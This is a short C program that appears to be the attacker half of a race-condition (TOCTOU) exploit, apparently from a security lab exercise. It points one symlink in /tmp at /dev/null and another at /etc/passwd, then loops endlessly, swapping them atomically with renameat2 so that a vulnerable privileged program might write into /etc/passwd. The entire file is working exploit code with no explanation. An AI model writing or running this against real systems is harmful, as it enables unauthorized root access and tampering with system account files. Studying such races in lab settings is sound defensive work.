#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>

int main(){
    unsigned int flags = RENAME_EXCHANGE;

    unlink("/tmp/XYZ");
    symlink("/dev/null", "/tmp/XYZ");
        
    unlink("/tmp/ABC");
    symlink("/etc/passwd", "/tmp/ABC");
    
    while (true){
        renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
        usleep(1000);
    }
    return 0;
}